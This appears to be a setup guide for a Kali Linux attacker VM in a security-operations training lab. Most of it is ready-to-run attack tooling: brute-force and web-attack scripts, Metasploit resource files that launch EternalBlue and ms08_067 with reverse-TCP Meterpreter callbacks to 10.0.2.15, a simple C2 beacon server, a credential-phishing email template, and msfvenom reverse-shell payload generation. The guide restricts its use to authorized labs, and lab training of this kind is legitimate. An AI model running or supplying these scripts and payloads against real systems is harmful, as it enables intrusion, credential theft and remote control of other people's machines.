# Kali Linux Attacker VM Configuration

## VM Specifications
- **OS**: Kali Linux 2023.4 (latest)
- **RAM**: 4GB (minimum), 8GB (recommended)
- **Storage**: 80GB
- **Network**: NAT Network (SOC-Lab-Network)
- **CPU**: 2 cores
- **IP Address**: DHCP (typically 10.0.2.15)

## Installation Steps

1. **Download Kali Linux ISO**
   - Download from official Kali Linux website: https://www.kali.org/get-kali/

2. **VirtualBox Configuration**
   ```bash
   # Create VM
   VBoxManage createvm --name "Kali-Attacker" --ostype "Debian_64" --register
   
   # Configure VM
   VBoxManage modifyvm "Kali-Attacker" --memory 4096 --cpus 2
   VBoxManage modifyvm "Kali-Attacker" --vram 128
   VBoxManage modifyvm "Kali-Attacker" --nic1 natnetwork --nat-network1 "SOC-Lab-Network"
   VBoxManage modifyvm "Kali-Attacker" --audio none
   VBoxManage modifyvm "Kali-Attacker" --clipboard bidirectional
   VBoxManage modifyvm "Kali-Attacker" --draganddrop bidirectional
   
   # Create and attach storage
   VBoxManage createhd --filename "Kali-Attacker.vdi" --size 81920
   VBoxManage storagectl "Kali-Attacker" --name "SATA Controller" --add sata --controller IntelAHCI
   VBoxManage storageattach "Kali-Attacker" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium "Kali-Attacker.vdi"
   VBoxManage storageattach "Kali-Attacker" --storagectl "SATA Controller" --port 1 --device 0 --type dvddrive --medium "kali-linux-2023.4-installer-amd64.iso"
   ```

## Post-Installation Configuration

### 1. Initial System Setup
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install additional tools
sudo apt install -y curl wget git vim htop
sudo apt install -y python3-pip golang-go
sudo apt install -y docker.io docker-compose
sudo apt install -y virtualenv python3-venv

# Add user to docker group
sudo usermod -aG docker $USER
```

### 2. Install Additional Penetration Testing Tools

#### Web Application Testing
```bash
# Install additional web testing tools
sudo apt install -y gobuster dirbuster wfuzz
sudo apt install -y sqlmap nikto whatweb
sudo apt install -y burpsuite zaproxy

# Install custom wordlists
sudo mkdir -p /usr/share/wordlists/custom
cd /usr/share/wordlists/custom
sudo wget https://github.com/danielmiessler/SecLists/archive/master.zip
sudo unzip master.zip
sudo mv SecLists-master SecLists
sudo rm master.zip
```

#### Network Penetration Testing
```bash
# Install network tools
sudo apt install -y masscan zmap
sudo apt install -y responder impacket-scripts
sudo apt install -y evil-winrm crackmapexec
sudo apt install -y bloodhound neo4j

# Install Covenant C2 framework
cd /opt
sudo git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
sudo dotnet build
```

#### Exploitation Frameworks
```bash
# Metasploit is pre-installed, but update it
sudo msfdb init
sudo msfconsole -q -x "db_rebuild_cache; exit"

# Install additional exploitation tools
sudo apt install -y exploitdb searchsploit
sudo apt install -y powershell-empire starkiller

# Install Cobalt Strike alternative - Sliver
cd /opt
sudo wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
sudo chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server
```

#### Post-Exploitation Tools
```bash
# Install post-exploitation tools
sudo apt install -y mimikatz
sudo apt install -y powersploit
sudo apt install -y empire

# Install privilege escalation tools
cd /opt
sudo git clone https://github.com/carlospolop/PEASS-ng.git
sudo git clone https://github.com/rebootuser/LinEnum.git
sudo git clone https://github.com/PowerShellMafia/PowerSploit.git
```

### 3. Create Attack Scripts

#### Automated Reconnaissance Script
```bash
# Create reconnaissance automation script
sudo tee /opt/recon-automation.sh > /dev/null <<'EOF'
#!/bin/bash

TARGET_NETWORK="10.0.2.0/24"
OUTPUT_DIR="/tmp/recon-$(date +%Y%m%d-%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[+] Starting reconnaissance of $TARGET_NETWORK"
echo "[+] Output directory: $OUTPUT_DIR"

# Network discovery
echo "[+] Performing network discovery..."
nmap -sn $TARGET_NETWORK > $OUTPUT_DIR/network-discovery.txt

# Port scanning
echo "[+] Performing port scanning..."
nmap -sS -sV -O -A $TARGET_NETWORK > $OUTPUT_DIR/port-scan.txt

# Service enumeration
echo "[+] Enumerating services..."
nmap --script=default,discovery,safe $TARGET_NETWORK > $OUTPUT_DIR/service-enum.txt

# Web service discovery
echo "[+] Discovering web services..."
nmap -p 80,443,8080,8443 --script=http-enum $TARGET_NETWORK > $OUTPUT_DIR/web-discovery.txt

# SMB enumeration
echo "[+] Enumerating SMB services..."
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery $TARGET_NETWORK > $OUTPUT_DIR/smb-enum.txt

echo "[+] Reconnaissance completed. Results saved to $OUTPUT_DIR"
EOF

chmod +x /opt/recon-automation.sh
```

#### Brute Force Attack Script
```bash
# Create brute force automation script
sudo tee /opt/bruteforce-automation.sh > /dev/null <<'EOF'
#!/bin/bash

TARGET_IP=$1
SERVICE=$2
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="/tmp/bruteforce-$(date +%Y%m%d-%H%M%S)"

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <service>"
    echo "Services: ssh, ftp, http, smb"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] Starting brute force attack against $TARGET_IP ($SERVICE)"
echo "[+] Output directory: $OUTPUT_DIR"

case $SERVICE in
    "ssh")
        echo "[+] Brute forcing SSH..."
        hydra -l root -P $WORDLIST $TARGET_IP ssh > $OUTPUT_DIR/ssh-bruteforce.txt
        hydra -l admin -P $WORDLIST $TARGET_IP ssh >> $OUTPUT_DIR/ssh-bruteforce.txt
        hydra -l vulnerable -P $WORDLIST $TARGET_IP ssh >> $OUTPUT_DIR/ssh-bruteforce.txt
        ;;
    "ftp")
        echo "[+] Brute forcing FTP..."
        hydra -l anonymous -P $WORDLIST $TARGET_IP ftp > $OUTPUT_DIR/ftp-bruteforce.txt
        hydra -l admin -P $WORDLIST $TARGET_IP ftp >> $OUTPUT_DIR/ftp-bruteforce.txt
        ;;
    "http")
        echo "[+] Brute forcing HTTP..."
        hydra -l admin -P $WORDLIST $TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" > $OUTPUT_DIR/http-bruteforce.txt
        ;;
    "smb")
        echo "[+] Brute forcing SMB..."
        hydra -l administrator -P $WORDLIST $TARGET_IP smb > $OUTPUT_DIR/smb-bruteforce.txt
        ;;
    *)
        echo "[-] Unknown service: $SERVICE"
        exit 1
        ;;
esac

echo "[+] Brute force attack completed. Results saved to $OUTPUT_DIR"
EOF

chmod +x /opt/bruteforce-automation.sh
```

#### Web Application Attack Script
```bash
# Create web application attack script
sudo tee /opt/webapp-attacks.sh > /dev/null <<'EOF'
#!/bin/bash

TARGET_URL=$1
OUTPUT_DIR="/tmp/webapp-attack-$(date +%Y%m%d-%H%M%S)"

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_url>"
    echo "Example: $0 http://10.0.2.101/dvwa"
    exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] Starting web application attacks against $TARGET_URL"
echo "[+] Output directory: $OUTPUT_DIR"

# Directory enumeration
echo "[+] Enumerating directories..."
gobuster dir -u $TARGET_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o $OUTPUT_DIR/directories.txt

# Nikto scan
echo "[+] Running Nikto scan..."
nikto -h $TARGET_URL -o $OUTPUT_DIR/nikto-scan.txt

# SQL injection testing
echo "[+] Testing for SQL injection..."
sqlmap -u "$TARGET_URL/login.php" --forms --batch --risk=3 --level=5 -o $OUTPUT_DIR/sqlmap-results.txt

# XSS testing
echo "[+] Testing for XSS..."
echo "Manual XSS payloads to test:" > $OUTPUT_DIR/xss-payloads.txt
echo "<script>alert('XSS')</script>" >> $OUTPUT_DIR/xss-payloads.txt
echo "<img src=x onerror=alert('XSS')>" >> $OUTPUT_DIR/xss-payloads.txt
echo "javascript:alert('XSS')" >> $OUTPUT_DIR/xss-payloads.txt

echo "[+] Web application attacks completed. Results saved to $OUTPUT_DIR"
EOF

chmod +x /opt/webapp-attacks.sh
```

### 4. Metasploit Configuration

#### Custom Metasploit Resource Scripts
```bash
# Create directory for custom Metasploit scripts
sudo mkdir -p /opt/metasploit-scripts

# Windows exploitation resource script
sudo tee /opt/metasploit-scripts/windows-exploit.rc > /dev/null <<'EOF'
# Windows exploitation automation
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.2.0/24
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.0.2.0/24
run

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.0/24
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.2.15
run

use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.0.2.0/24
set payload windows/meterpreter/reverse_tcp
set LHOST 10.0.2.15
run
EOF

# Linux exploitation resource script
sudo tee /opt/metasploit-scripts/linux-exploit.rc > /dev/null <<'EOF'
# Linux exploitation automation
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.0.2.0/24
run

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.2.0/24
set USERNAME vulnerable
set PASSWORD password
run

use exploit/linux/ssh/sshexec
set RHOSTS 10.0.2.101
set USERNAME vulnerable
set PASSWORD password
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.2.15
run
EOF
```

### 5. Social Engineering Tools

#### Phishing Campaign Setup
```bash
# Install Social Engineering Toolkit
sudo apt install -y set

# Install Gophish
cd /opt
sudo wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
sudo unzip gophish-v0.12.1-linux-64bit.zip
sudo chmod +x gophish
sudo rm gophish-v0.12.1-linux-64bit.zip

# Create phishing template
sudo tee /opt/phishing-template.html > /dev/null <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 600px; margin: 0 auto; }
        .header { background-color: #d32f2f; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; border: 1px solid #ddd; }
        .button { background-color: #1976d2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>URGENT: Security Update Required</h2>
        </div>
        <div class="content">
            <p>Dear User,</p>
            <p>Our security team has detected suspicious activity on your account. Please click the link below to verify your credentials and secure your account.</p>
            <p><a href="{{.URL}}" class="button">Verify Account Now</a></p>
            <p>If you do not complete this verification within 24 hours, your account may be suspended.</p>
            <p>Thank you,<br>IT Security Team</p>
        </div>
    </div>
</body>
</html>
EOF
```

### 6. Command and Control (C2) Setup

#### Simple HTTP C2 Server
```bash
# Create simple C2 server
sudo tee /opt/simple-c2-server.py > /dev/null <<'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import base64
import subprocess
import threading
import time

PORT = 8080

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/beacon':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            
            # Simple command queue (in real scenario, use database)
            command = "whoami"  # Default command
            self.wfile.write(base64.b64encode(command.encode()).encode())
            
        elif self.path.startswith('/result/'):
            # Receive command results
            result = base64.b64decode(self.path.split('/')[-1]).decode()
            print(f"[+] Command result: {result}")
            
            self.send_response(200)
            self.end_headers()
        else:
            super().do_GET()

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
        print(f"[+] C2 Server running on port {PORT}")
        httpd.serve_forever()
EOF

chmod +x /opt/simple-c2-server.py
```

### 7. Attack Scenarios

#### Create Attack Scenario Scripts
```bash
# Create attack scenarios directory
sudo mkdir -p /opt/attack-scenarios

# Scenario 1: Initial Access
sudo tee /opt/attack-scenarios/01-initial-access.sh > /dev/null <<'EOF'
#!/bin/bash
echo "[+] Attack Scenario 1: Initial Access"
echo "[+] Target: Vulnerable Windows and Linux systems"

# Network discovery
echo "[+] Step 1: Network Discovery"
nmap -sn 10.0.2.0/24

# Service enumeration
echo "[+] Step 2: Service Enumeration"
nmap -sS -sV 10.0.2.101-103

# Brute force attacks
echo "[+] Step 3: Credential Attacks"
hydra -l vulnerable -p password 10.0.2.101 ssh
hydra -l admin -p admin 10.0.2.102 ssh

echo "[+] Initial access scenario completed"
EOF

# Scenario 2: Privilege Escalation
sudo tee /opt/attack-scenarios/02-privilege-escalation.sh > /dev/null <<'EOF'
#!/bin/bash
echo "[+] Attack Scenario 2: Privilege Escalation"
echo "[+] Assumes initial access has been gained"

# Linux privilege escalation
echo "[+] Step 1: Linux Privilege Escalation"
echo "Run LinEnum.sh on compromised Linux system"
echo "Check for SUID binaries, weak file permissions"

# Windows privilege escalation
echo "[+] Step 2: Windows Privilege Escalation"
echo "Run PowerUp.ps1 on compromised Windows system"
echo "Check for unquoted service paths, weak service permissions"

echo "[+] Privilege escalation scenario completed"
EOF

# Scenario 3: Lateral Movement
sudo tee /opt/attack-scenarios/03-lateral-movement.sh > /dev/null <<'EOF'
#!/bin/bash
echo "[+] Attack Scenario 3: Lateral Movement"
echo "[+] Moving from compromised system to other network hosts"

# SMB enumeration
echo "[+] Step 1: SMB Enumeration"
smbclient -L //10.0.2.102 -N
enum4linux 10.0.2.102

# Pass-the-hash attacks
echo "[+] Step 2: Pass-the-Hash"
echo "Use Mimikatz to extract hashes"
echo "Use psexec.py to move laterally"

# WMI abuse
echo "[+] Step 3: WMI Abuse"
echo "Use wmiexec.py for remote command execution"

echo "[+] Lateral movement scenario completed"
EOF

chmod +x /opt/attack-scenarios/*.sh
```

### 8. Payload Generation

#### Custom Payload Generation Script
```bash
# Create payload generation script
sudo tee /opt/generate-payloads.sh > /dev/null <<'EOF'
#!/bin/bash

LHOST="10.0.2.15"
LPORT="4444"
OUTPUT_DIR="/tmp/payloads-$(date +%Y%m%d-%H%M%S)"

mkdir -p $OUTPUT_DIR

echo "[+] Generating payloads..."
echo "[+] LHOST: $LHOST"
echo "[+] LPORT: $LPORT"
echo "[+] Output directory: $OUTPUT_DIR"

# Windows payloads
echo "[+] Generating Windows payloads..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_reverse_tcp.exe
msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_shell_reverse_tcp.exe

# Linux payloads
echo "[+] Generating Linux payloads..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_reverse_tcp
msfvenom -p linux/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_shell_reverse_tcp

# Web payloads
echo "[+] Generating web payloads..."
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > $OUTPUT_DIR/php_reverse_tcp.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > $OUTPUT_DIR/jsp_reverse_tcp.jsp

# PowerShell payloads
echo "[+] Generating PowerShell payloads..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell > $OUTPUT_DIR/powershell_reverse_tcp.ps1

chmod +x $OUTPUT_DIR/linux_*

echo "[+] Payload generation completed. Files saved to $OUTPUT_DIR"
ls -la $OUTPUT_DIR
EOF

chmod +x /opt/generate-payloads.sh
```

## Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| Kali Login | kali | kali |
| Root | root | toor |

## Pre-installed Tools Summary

### Network Scanning
- **Nmap** - Network discovery and port scanning
- **Masscan** - High-speed port scanner
- **Zmap** - Internet-wide network scanner

### Web Application Testing
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Web application security scanner
- **SQLMap** - SQL injection testing
- **Nikto** - Web server scanner
- **Gobuster** - Directory/file enumeration

### Exploitation
- **Metasploit** - Exploitation framework
- **Searchsploit** - Exploit database search
- **Social Engineering Toolkit** - Social engineering attacks

### Post-Exploitation
- **Mimikatz** - Windows credential extraction
- **PowerSploit** - PowerShell post-exploitation
- **LinEnum** - Linux enumeration script

### Network Services
- **Responder** - LLMNR/NBT-NS poisoner
- **Impacket** - Network protocol implementations
- **CrackMapExec** - Network service exploitation

## Attack Workflow Examples

### 1. Basic Network Penetration Test
```bash
# Step 1: Reconnaissance
/opt/recon-automation.sh

# Step 2: Vulnerability Assessment
nmap --script vuln 10.0.2.0/24

# Step 3: Exploitation
msfconsole -r /opt/metasploit-scripts/windows-exploit.rc

# Step 4: Post-Exploitation
# Use Meterpreter for privilege escalation and persistence
```

### 2. Web Application Testing
```bash
# Step 1: Web service discovery
nmap -p 80,443,8080 --script http-enum 10.0.2.0/24

# Step 2: Automated web attacks
/opt/webapp-attacks.sh http://10.0.2.101/dvwa

# Step 3: Manual testing with Burp Suite
# Configure browser proxy and test manually
```

## Security Notes

⚠️ **WARNING**: This VM contains powerful penetration testing tools and should only be used in authorized lab environments. Never use these tools against systems you do not own or have explicit permission to test.

## Useful Commands

```bash
# Start Metasploit
msfconsole

# Update Metasploit
msfupdate

# Start Apache for hosting payloads
sudo systemctl start apache2

# Start SSH for file transfers
sudo systemctl start ssh

# Generate quick reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f elf > shell.elf
```